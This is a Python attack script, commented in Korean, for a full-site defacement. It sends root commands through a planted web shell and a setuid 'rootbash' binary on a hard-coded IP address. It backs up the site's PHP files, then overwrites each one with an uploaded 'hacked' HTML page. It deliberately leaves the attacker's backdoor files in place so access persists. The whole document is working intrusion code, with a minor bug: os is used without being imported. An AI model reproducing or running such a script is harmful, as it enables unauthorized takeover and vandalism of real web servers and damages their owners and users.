#!/usr/bin/env python3
"""
간단한 전체 사이트 디페이스
모든 PHP 파일을 해킹 페이지로 교체
"""

import requests
import base64
from urllib.parse import quote
import time

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/uploads/x.php"
ROOTBASH = "/var/www/html/www/uploads/rootbash"

# 리버스 쉘에서 확인한 PHP 파일 목록
PHP_FILES = [
    "add_comment.php",
    "config.php",
    "download.php",
    "file.php",
    "index.php",
    "like_post.php",
    "login.php",
    "logout.php",
    "new_post.php",
    "profile.php",
    "register.php",
    "setup.php",
    "upload.php"
]

# 백도어 파일은 제외
BACKDOOR_FILES = ["health-check.php", "system-check.php", "test_db.php"]

def execute_root(cmd):
    """루트 권한으로 명령 실행"""
    full_cmd = f"{ROOTBASH} -p -c '{cmd}'"
    encoded = quote(full_cmd)
    try:
        r = requests.get(f"{WEBSHELL}?x={encoded}", timeout=10)
        return r.text
    except Exception as e:
        return f"Error: {e}"

def main():
    print("="*60)
    print("  전체 사이트 디페이스")
    print("  Target: 52.78.221.104")
    print("="*60)
    print()

    # 1. 연결 테스트
    print("[1/4] 연결 테스트 중...")
    whoami = execute_root("whoami")
    if "root" in whoami:
        print(f"  ✓ Root 권한 확인: {whoami.strip()}")
    else:
        print(f"  ✗ Root 권한 없음!")
        return
    print()

    # 2. 백업
    print("[2/4] 원본 백업 중...")
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    backup_dir = f"/root/backup_{timestamp}"
    execute_root(f"mkdir -p {backup_dir}")
    print(f"  ✓ 백업 디렉토리: {backup_dir}")

    for php_file in PHP_FILES:
        execute_root(f"cp /var/www/html/www/{php_file} {backup_dir}/ 2>/dev/null || true")
        print(f"  - {php_file} 백업")
    print()

    # 3. 해킹 페이지 업로드
    print("[3/4] 해킹 페이지 업로드 중...")

    try:
        with open("fin/defacement/hacked_page.html", "r", encoding="utf-8") as f:
            hacked_html = f.read()
    except:
        print("  ✗ hacked_page.html 파일을 찾을 수 없습니다!")
        print("  현재 디렉토리:", os.getcwd())
        return

    # Base64 인코딩
    encoded_html = base64.b64encode(hacked_html.encode()).decode()

    # 서버에 전송 (한 번에)
    cmd = f"echo '{encoded_html}' | base64 -d > /tmp/hacked_page.html"
    execute_root(cmd)
    print("  ✓ 해킹 페이지 업로드 완료")
    print()

    # 4. PHP 파일 교체
    print("[4/4] PHP 파일 교체 중...")

    success = 0
    skip = 0

    for php_file in PHP_FILES:
        if php_file in BACKDOOR_FILES:
            print(f"  [SKIP] {php_file} (백도어)")
            skip += 1
            continue

        # 파일 교체
        execute_root(f"cp /tmp/hacked_page.html /var/www/html/www/{php_file}")
        print(f"  [✓] {php_file}")
        success += 1

    print()
    print("="*60)
    print("  디페이스 완료!")
    print("="*60)
    print()
    print(f"교체 완료: {success}개")
    print(f"건너뜀: {skip}개")
    print()
    print("확인:")
    print(f"  {TARGET}/")
    print(f"  {TARGET}/login.php")
    print(f"  {TARGET}/profile.php")
    print()
    print("복구 방법:")
    print(f"  curl \"{WEBSHELL}?x={ROOTBASH}%20-p%20-c%20'cp%20-r%20{backup_dir}/*.php%20/var/www/html/www/'\"")
    print()
    print("="*60)

    # 정리
    execute_root("rm -f /tmp/hacked_page.html")

if __name__ == "__main__":
    main()
